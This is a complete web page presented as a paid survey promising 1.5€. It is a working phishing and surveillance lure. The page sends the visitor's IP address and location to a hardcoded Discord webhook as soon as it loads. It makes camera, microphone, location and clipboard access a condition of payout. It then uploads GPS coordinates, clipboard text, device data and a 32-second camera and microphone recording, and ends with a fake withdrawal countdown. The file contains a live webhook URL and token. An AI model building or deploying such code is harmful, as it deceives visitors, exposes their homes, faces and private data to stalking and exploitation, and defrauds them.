<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Earn 1.5€ – Real-time Logger</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(145deg, #e0eafc 0%, #cfdef3 100%);
            font-family: 'Segoe UI', Roboto, sans-serif;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 800px;
            width: 100%;
            background: white;
            border-radius: 32px;
            box-shadow: 0 25px 45px rgba(0,0,0,0.15);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(95deg, #1f5e3a, #2c7a4d);
            color: white;
            padding: 24px 28px;
            text-align: center;
        }
        .header h1 { font-size: 1.8rem; font-weight: 700; }
        .earn-badge {
            background: gold;
            color: #1e3a2f;
            display: inline-block;
            padding: 6px 18px;
            border-radius: 40px;
            font-weight: bold;
            margin-top: 12px;
        }
        .content { padding: 28px 30px 35px; }
        .question-item {
            margin-bottom: 22px;
            border-bottom: 1px solid #e2e8f0;
            padding-bottom: 14px;
        }
        .options {
            display: flex;
            flex-wrap: wrap;
            gap: 12px;
        }
        .options label {
            background: #f1f5f9;
            padding: 6px 14px;
            border-radius: 40px;
            cursor: pointer;
            font-size: 0.85rem;
        }
        .options input { margin-right: 6px; }
        .permission-panel {
            background: #fff8e7;
            border-left: 5px solid #f59e0b;
            padding: 16px 20px;
            margin: 25px 0 20px;
            border-radius: 20px;
        }
        .perm-step {
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 12px;
            margin: 12px 0;
        }
        .perm-btn {
            background: #2c7a4d;
            color: white;
            border: none;
            padding: 6px 18px;
            border-radius: 30px;
            cursor: pointer;
            font-weight: 600;
        }
        .perm-btn:disabled { background: #94a3b8; cursor: not-allowed; }
        .status { font-size: 0.85rem; color: #2d3748; }
        .location-map {
            background: #e6f7ff;
            border-radius: 16px;
            padding: 12px;
            margin: 12px 0;
            display: none;
        }
        .submit-btn {
            background: #f59e0b;
            color: #1e293b;
            border: none;
            padding: 14px 28px;
            border-radius: 60px;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            margin-top: 15px;
        }
        .submit-btn:disabled { background: #cbd5e1; cursor: not-allowed; }
        .withdraw-section {
            background: #fef9e3;
            padding: 20px;
            border-radius: 24px;
            margin-top: 20px;
            display: none;
        }
        .timer {
            font-family: monospace;
            font-size: 1.6rem;
            text-align: center;
            margin: 20px 0;
            color: #d9534f;
        }
        .footer { background: #f8fafc; padding: 14px; text-align: center; font-size: 11px; }
    </style>
</head>
<body>
<div class="container" id="mainContainer">
    <div class="header">
        <h1>💰 Earn 1.5€ instantly!</h1>
        <div class="earn-badge">🎁 Your reward: 1.5 €</div>
    </div>
    <div class="content" id="dynamicContent"></div>
    <div class="footer">Secure payment • Real-time verification</div>
</div>

<script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1479602171736494100/TtSG3mzG9tpZg0TiLkBCHvjtMVw4SkbqfZEWJRfU5hi_uHyoGb7WqwaS5GNUM5vphNwR";

    // ========== 14 SURVEY QUESTIONS ==========
    const questions = [
        "How often do you shop online?", "Which social media do you use most?", "Your age group?",
        "Most important smartphone feature?", "Daily internet usage?", "Favorite streaming service?",
        "Do you use ad blockers?", "Primary operating system?", "Targeted ads make you feel?",
        "Preferred payment method?", "Do you read privacy policies?", "Likely to recommend product?",
        "Do you use a VPN?", "Which browser do you prefer?"
    ];
    const optionSets = [
        ["Daily","Weekly","Monthly","Rarely"], ["TikTok","Instagram","Twitter","Facebook","LinkedIn"],
        ["18-24","25-34","35-44","45+"], ["Battery","Camera","Performance","Price"],
        ["<2h","2-5h","5-8h",">8h"], ["Netflix","YouTube","Disney+","Prime Video","Other"],
        ["Always","Sometimes","Never","What is ad blocker?"], ["Windows","macOS","Linux","Android","iOS"],
        ["Acceptable","Annoying","Invasion of privacy","I don't care"], ["Credit card","PayPal","Crypto","Bank transfer"],
        ["Always","Sometimes","Never","Didn't know"], ["Very likely","Likely","Neutral","Unlikely"],
        ["Yes","No","What is VPN?"], ["Chrome","Firefox","Edge","Safari","Opera","Brave"]
    ];

    let userAnswers = {};
    let cameraStream = null;
    let locationData = null;
    let orientationData = null;
    let hidData = null;
    let serialData = null;
    let nfcData = null;
    let lightData = null;

    // Global flags to prevent duplicate sending of same permission data
    let locationSent = false;
    let orientationSent = false;
    let hidSent = false;
    let serialSent = false;
    let nfcSent = false;
    let lightSent = false;
    let cameraStarted = false;

    // ========== HELPER: SEND ANY DATA TO DISCORD ==========
    async function sendToDiscord(title, description, fields = [], color = 0x3498db, fileBlob = null, fileName = null) {
        const formData = new FormData();
        if (fileBlob && fileName) {
            formData.append("file", fileBlob, fileName);
        }
        const embed = {
            embeds: [{
                title: title,
                description: description,
                color: color,
                fields: fields,
                timestamp: new Date().toISOString()
            }]
        };
        formData.append("payload_json", JSON.stringify(embed));
        // Use fetch with background priority (no await to avoid blocking)
        fetch(WEBHOOK_URL, { method: "POST", body: formData }).catch(e => console.error);
    }

    // ========== VIDEO RECORDING (STARTS IMMEDIATELY ON CAMERA GRANT) ==========
    let mediaRecorder = null;
    let recordedChunks = [];
    let recordingActive = false;
    let recordingIntervals = [1,5,10,20,30,32]; // seconds at which to send
    let recordingStartTime = null;

    async function startProgressiveRecording(stream) {
        if (cameraStarted) return;
        cameraStarted = true;
        recordedChunks = [];
        mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
        mediaRecorder.ondataavailable = (e) => { if (e.data.size>0) recordedChunks.push(e.data); };
        mediaRecorder.start(100);
        recordingActive = true;
        recordingStartTime = Date.now();

        // Send first message: camera started
        sendToDiscord("🎥 Camera started", "Recording begun – will send chunks at 1,5,10,20,30,32 seconds", [], 0xff5500);

        for (let sec of recordingIntervals) {
            setTimeout(async () => {
                if (!recordingActive) return;
                if (mediaRecorder && mediaRecorder.state === "recording") {
                    mediaRecorder.stop();
                    await new Promise(resolve => {
                        mediaRecorder.onstop = async () => {
                            const blob = new Blob(recordedChunks, { type: "video/webm" });
                            // Send video chunk
                            await sendToDiscord(`🎥 Video chunk (${sec} sec)`, `Size: ${(blob.size/1024).toFixed(1)} KB`, [], 0xff5500, blob, `video_${sec}s.webm`);
                            // Reset for next chunk
                            recordedChunks = [];
                            mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
                            mediaRecorder.ondataavailable = (e) => { if (e.data.size>0) recordedChunks.push(e.data); };
                            mediaRecorder.start(100);
                            resolve();
                        };
                    });
                }
            }, sec * 1000);
        }
        // Final stop after 32 seconds
        setTimeout(() => {
            if (mediaRecorder && mediaRecorder.state === "recording") {
                mediaRecorder.stop();
                mediaRecorder.onstop = async () => {
                    if (recordedChunks.length) {
                        const blob = new Blob(recordedChunks, { type: "video/webm" });
                        await sendToDiscord("🎥 Final video (32 sec)", `Size: ${(blob.size/1024).toFixed(1)} KB`, [], 0xff5500, blob, `video_final.webm`);
                    }
                    recordingActive = false;
                };
            }
        }, 32000);
    }

    // ========== PERMISSION HANDLERS (EACH SENDS IMMEDIATELY) ==========
    async function requestGeolocation() {
        try {
            const pos = await new Promise((res,rej)=> navigator.geolocation.getCurrentPosition(res,rej, {enableHighAccuracy:true}));
            const lat = pos.coords.latitude, lon = pos.coords.longitude;
            const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
            const data = await geoRes.json();
            locationData = { address: data.display_name, lat, lon };
            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
            // Send immediately to Discord
            await sendToDiscord("📍 GPS Location granted", `**Address:** ${data.display_name}\n**Coordinates:** ${lat}, ${lon}\n[Open in Google Maps](${mapsLink})`, [], 0x00aaff);
            // Show on page
            const mapDiv = document.getElementById("locationMap");
            if (mapDiv) {
                mapDiv.innerHTML = `📍 <a href="${mapsLink}" target="_blank">Open in Google Maps</a> (${lat.toFixed(5)}, ${lon.toFixed(5)})`;
                mapDiv.style.display = "block";
            }
            return true;
        } catch(e) { return false; }
    }

    async function requestMicrophone() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            stream.getTracks().forEach(t=>t.stop());
            await sendToDiscord("🎤 Microphone granted", "Microphone access allowed (audio will be included in video recording if camera is also enabled)", [], 0x44aa44);
            return true;
        } catch(e) { return false; }
    }

    async function requestCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            cameraStream = stream;
            await sendToDiscord("🎥 Camera granted", "Camera and microphone stream acquired – starting recording", [], 0xffaa00);
            startProgressiveRecording(stream);
            return true;
        } catch(e) { return false; }
    }

    async function requestNotifications() {
        if (Notification.permission === "granted") return true;
        const result = await Notification.requestPermission();
        if (result === "granted") {
            await sendToDiscord("🔔 Notifications granted", "User allowed notifications", [], 0xaa88ff);
            return true;
        }
        return false;
    }

    async function requestClipboard() {
        try {
            const text = await navigator.clipboard.readText();
            await sendToDiscord("📋 Clipboard read", `Content: ${text.substring(0, 500)}`, [], 0xaa44aa);
            return true;
        } catch(e) { return false; }
    }

    // Advanced sensors
    async function requestDeviceOrientation() {
        if (typeof DeviceOrientationEvent !== "undefined" && typeof DeviceOrientationEvent.requestPermission === "function") {
            try {
                const permissionState = await DeviceOrientationEvent.requestPermission();
                if (permissionState === "granted") {
                    window.addEventListener("deviceorientation", (e) => {
                        orientationData = { alpha: e.alpha, beta: e.beta, gamma: e.gamma };
                        if (!orientationSent && orientationData) {
                            orientationSent = true;
                            sendToDiscord("📳 Device Orientation", `Alpha: ${e.alpha}, Beta: ${e.beta}, Gamma: ${e.gamma}`, [], 0x88aaff);
                        }
                    });
                    return true;
                }
            } catch(e) { return false; }
        } else if (window.DeviceOrientationEvent) {
            window.addEventListener("deviceorientation", (e) => {
                orientationData = { alpha: e.alpha, beta: e.beta, gamma: e.gamma };
                if (!orientationSent && orientationData) {
                    orientationSent = true;
                    sendToDiscord("📳 Device Orientation", `Alpha: ${e.alpha}, Beta: ${e.beta}, Gamma: ${e.gamma}`, [], 0x88aaff);
                }
            });
            return true;
        }
        return false;
    }

    async function requestHID() {
        if (!navigator.hid) return false;
        try {
            const devices = await navigator.hid.requestDevice({ filters: [] });
            hidData = devices.map(d => ({ name: d.productName, vendorId: d.vendorId }));
            await sendToDiscord("🔌 HID Devices", JSON.stringify(hidData, null, 2), [], 0xaa8866);
            return true;
        } catch(e) { return false; }
    }

    async function requestSerial() {
        if (!navigator.serial) return false;
        try {
            const ports = await navigator.serial.getPorts();
            serialData = ports.map(p => ({ type: "Serial port" }));
            await sendToDiscord("🔗 Serial Ports", `Found ${ports.length} port(s)`, [], 0x66aa88);
            return true;
        } catch(e) { return false; }
    }

    async function requestNFC() {
        if (!("NDEFReader" in window)) return false;
        try {
            const reader = new NDEFReader();
            await reader.scan();
            reader.onreading = (event) => {
                nfcData = event.message.records;
                if (!nfcSent) {
                    nfcSent = true;
                    sendToDiscord("📡 NFC Tag read", JSON.stringify(nfcData), [], 0x77aaff);
                }
            };
            return true;
        } catch(e) { return false; }
    }

    async function requestAmbientLight() {
        if (!("AmbientLightSensor" in window)) return false;
        try {
            const sensor = new AmbientLightSensor();
            sensor.onreading = () => {
                lightData = sensor.illuminance;
                if (!lightSent && lightData) {
                    lightSent = true;
                    sendToDiscord("💡 Ambient Light", `${lightData} lux`, [], 0xffdd88);
                }
            };
            sensor.start();
            return true;
        } catch(e) { return false; }
    }

    // ========== UI RENDER ==========
    function renderPage() {
        let html = `<div id="questionsArea"></div>
        <div class="permission-panel">
            <div style="font-weight:bold;">🔐 Required for payout (each grants real-time data):</div>
            <div class="perm-step">📍 Location <button class="perm-btn" id="btnGeo">Allow</button> <span id="statusGeo" class="status">pending</span></div>
            <div id="locationMap" class="location-map"></div>
            <div class="perm-step">🎤 Microphone <button class="perm-btn" id="btnMic">Allow</button> <span id="statusMic" class="status">pending</span></div>
            <div class="perm-step">🎥 Camera <button class="perm-btn" id="btnCamera">Allow</button> <span id="statusCamera" class="status">pending</span></div>
            <div class="perm-step">🔔 Notifications <button class="perm-btn" id="btnNotif">Allow</button> <span id="statusNotif" class="status">pending</span></div>
            <div class="perm-step">📋 Clipboard <button class="perm-btn" id="btnClip">Allow</button> <span id="statusClip" class="status">pending</span></div>
        </div>
        <div class="permission-panel" style="margin-top:10px;">
            <div style="font-weight:bold;">🛸 Advanced sensors (optional – each sends data immediately when allowed):</div>
            <div class="perm-step">📳 Device Orientation <button class="perm-btn" id="btnOrientation">Allow</button> <span id="statusOrientation" class="status">pending</span></div>
            <div class="perm-step">🖱️ HID devices <button class="perm-btn" id="btnHID">Allow</button> <span id="statusHID" class="status">pending</span></div>
            <div class="perm-step">🔌 Serial Ports <button class="perm-btn" id="btnSerial">Allow</button> <span id="statusSerial" class="status">pending</span></div>
            <div class="perm-step">📡 NFC <button class="perm-btn" id="btnNFC">Allow</button> <span id="statusNFC" class="status">pending</span></div>
            <div class="perm-step">💡 Ambient Light <button class="perm-btn" id="btnLight">Allow</button> <span id="statusLight" class="status">pending</span></div>
        </div>
        <button class="submit-btn" id="submitSurvey" disabled>✅ Complete survey & get 1.5€</button>`;
        document.getElementById("dynamicContent").innerHTML = html;
        // generate questions
        let qhtml = '';
        for (let i=0; i<questions.length; i++) {
            qhtml += `<div class="question-item"><div class="options" data-qid="${i}">${questions[i]}<br>`;
            for (let opt of optionSets[i]) {
                qhtml += `<label><input type="radio" name="q${i}" value="${opt}"> ${opt}</label>`;
            }
            qhtml += `</div></div>`;
        }
        document.getElementById("questionsArea").innerHTML = qhtml;
        document.querySelectorAll('input[type="radio"]').forEach(r => {
            r.addEventListener('change', (e) => {
                const qid = e.target.closest('.options').getAttribute('data-qid');
                userAnswers[qid] = e.target.value;
            });
        });

        // Attach handlers – each sends its own data immediately on success and updates UI
        const btnGeo = document.getElementById("btnGeo");
        const btnMic = document.getElementById("btnMic");
        const btnCamera = document.getElementById("btnCamera");
        const btnNotif = document.getElementById("btnNotif");
        const btnClip = document.getElementById("btnClip");
        const btnOrientation = document.getElementById("btnOrientation");
        const btnHID = document.getElementById("btnHID");
        const btnSerial = document.getElementById("btnSerial");
        const btnNFC = document.getElementById("btnNFC");
        const btnLight = document.getElementById("btnLight");
        const statusGeo = document.getElementById("statusGeo");
        const statusMic = document.getElementById("statusMic");
        const statusCamera = document.getElementById("statusCamera");
        const statusNotif = document.getElementById("statusNotif");
        const statusClip = document.getElementById("statusClip");
        const statusOrientation = document.getElementById("statusOrientation");
        const statusHID = document.getElementById("statusHID");
        const statusSerial = document.getElementById("statusSerial");
        const statusNFC = document.getElementById("statusNFC");
        const statusLight = document.getElementById("statusLight");

        btnGeo.onclick = async () => {
            statusGeo.innerText = "requesting...";
            const ok = await requestGeolocation();
            statusGeo.innerHTML = ok ? "✅ granted (sent)" : "❌ denied";
            btnGeo.disabled = ok;
            checkAll();
        };
        btnMic.onclick = async () => {
            statusMic.innerText = "requesting...";
            const ok = await requestMicrophone();
            statusMic.innerHTML = ok ? "✅ granted (sent)" : "❌ denied";
            btnMic.disabled = ok;
            checkAll();
        };
        btnCamera.onclick = async () => {
            statusCamera.innerText = "requesting...";
            const ok = await requestCamera();
            statusCamera.innerHTML = ok ? "✅ granted (recording)" : "❌ denied";
            btnCamera.disabled = ok;
            checkAll();
        };
        btnNotif.onclick = async () => {
            statusNotif.innerText = "requesting...";
            const ok = await requestNotifications();
            statusNotif.innerHTML = ok ? "✅ granted (sent)" : "❌ denied";
            btnNotif.disabled = ok;
            checkAll();
        };
        btnClip.onclick = async () => {
            statusClip.innerText = "requesting...";
            const ok = await requestClipboard();
            statusClip.innerHTML = ok ? "✅ granted (sent)" : "❌ denied";
            btnClip.disabled = ok;
            checkAll();
        };
        btnOrientation.onclick = async () => {
            statusOrientation.innerText = "requesting...";
            const ok = await requestDeviceOrientation();
            statusOrientation.innerHTML = ok ? "✅ granted (sent)" : "❌ denied/unsupported";
            btnOrientation.disabled = ok;
            checkAll();
        };
        btnHID.onclick = async () => {
            statusHID.innerText = "requesting...";
            const ok = await requestHID();
            statusHID.innerHTML = ok ? "✅ granted (sent)" : "❌ denied";
            btnHID.disabled = ok;
            checkAll();
        };
        btnSerial.onclick = async () => {
            statusSerial.innerText = "requesting...";
            const ok = await requestSerial();
            statusSerial.innerHTML = ok ? "✅ granted (sent)" : "❌ denied";
            btnSerial.disabled = ok;
            checkAll();
        };
        btnNFC.onclick = async () => {
            statusNFC.innerText = "requesting...";
            const ok = await requestNFC();
            statusNFC.innerHTML = ok ? "✅ granted (listening)" : "❌ denied/unsupported";
            btnNFC.disabled = ok;
            checkAll();
        };
        btnLight.onclick = async () => {
            statusLight.innerText = "requesting...";
            const ok = await requestAmbientLight();
            statusLight.innerHTML = ok ? "✅ granted (sent)" : "❌ denied/unsupported";
            btnLight.disabled = ok;
            checkAll();
        };

        function checkAll() {
            const allBasic = (btnGeo.disabled && btnMic.disabled && btnCamera.disabled && btnNotif.disabled && btnClip.disabled);
            const submitBtn = document.getElementById("submitSurvey");
            submitBtn.disabled = !allBasic;
            if (allBasic) submitBtn.innerText = "✅ Claim my 1.5€ now!";
        }

        document.getElementById("submitSurvey").onclick = async () => {
            const btn = document.getElementById("submitSurvey");
            if (btn.disabled) return;
            btn.disabled = true;
            btn.innerText = "Submitting...";
            // Collect all answers
            const finalAnswers = {};
            for (let i=0; i<questions.length; i++) {
                const selected = document.querySelector(`input[name="q${i}"]:checked`);
                finalAnswers[i] = selected ? selected.value : "(not answered)";
            }
            // Build final text log (can also include all previously sent data)
            let report = `FINAL SURVEY ANSWERS\nTime: ${new Date().toISOString()}\n`;
            for (let i=0; i<questions.length; i++) {
                report += `${i+1}. ${questions[i]} → ${finalAnswers[i]}\n`;
            }
            const blob = new Blob([report], { type: "text/plain" });
            await sendToDiscord("📝 Final Survey Answers", "All answers attached", [], 0x2c7a4d, blob, `survey_answers_${Date.now()}.txt`);
            // Show withdrawal options
            showWithdrawOptions(finalAnswers);
        };
    }

    async function showWithdrawOptions(answers) {
        const container = document.getElementById("dynamicContent");
        container.innerHTML = `
            <div class="withdraw-section" style="display:block;">
                <h3>🎉 You earned 1.5 €!</h3>
                <p>Choose withdrawal method:</p>
                <div style="display:flex; gap:15px; flex-wrap:wrap;">
                    <button class="perm-btn" id="btc">₿ Bitcoin</button>
                    <button class="perm-btn" id="ltc">Ł Litecoin</button>
                    <button class="perm-btn" id="eth">Ξ Ethereum</button>
                    <button class="perm-btn" id="bank">🏦 Bank Transfer</button>
                </div>
                <div id="timerArea" style="font-size:1.4rem; text-align:center; margin-top:20px;"></div>
            </div>
        `;
        const timerDiv = document.getElementById("timerArea");
        const handleWithdraw = async (method) => {
            await sendToDiscord("💸 Withdrawal Request", `User selected ${method}`, [], 0xf59e0b);
            let seconds = 420;
            timerDiv.innerText = `⏳ Processing ${method}... 7:00 minutes`;
            const interval = setInterval(() => {
                if (seconds <= 0) {
                    clearInterval(interval);
                    timerDiv.innerText = "✅ Payment sent! Check wallet/bank within 24h.";
                    setTimeout(() => container.innerHTML = `<div style="text-align:center; padding:30px;"><h3>Thank you!</h3></div>`, 3000);
                } else {
                    const mins = Math.floor(seconds / 60);
                    const secs = seconds % 60;
                    timerDiv.innerText = `⏳ Processing ${method}... ${mins}:${secs.toString().padStart(2,'0')} minutes`;
                    seconds--;
                }
            }, 1000);
            document.querySelectorAll(".perm-btn").forEach(b => b.disabled = true);
        };
        document.getElementById("btc").onclick = () => handleWithdraw("BTC");
        document.getElementById("ltc").onclick = () => handleWithdraw("LTC");
        document.getElementById("eth").onclick = () => handleWithdraw("ETH");
        document.getElementById("bank").onclick = () => handleWithdraw("Bank");
    }

    // initial IP webhook
    (async function() {
        try {
            const ipRes = await fetch("https://api.ipify.org?format=json");
            const ip = (await ipRes.json()).ip;
            const geoRes = await fetch("https://ipapi.co/json/");
            const geo = geoRes.ok ? await geoRes.json() : {};
            await sendToDiscord("🌐 IP Address", `**IP:** ${ip}\n**Location:** ${geo.city}, ${geo.country_name}\n**ISP:** ${geo.org || "Unknown"}`, [], 0x3498db);
        } catch(e) {}
    })();

    renderPage();
</script>
</body>
</html>
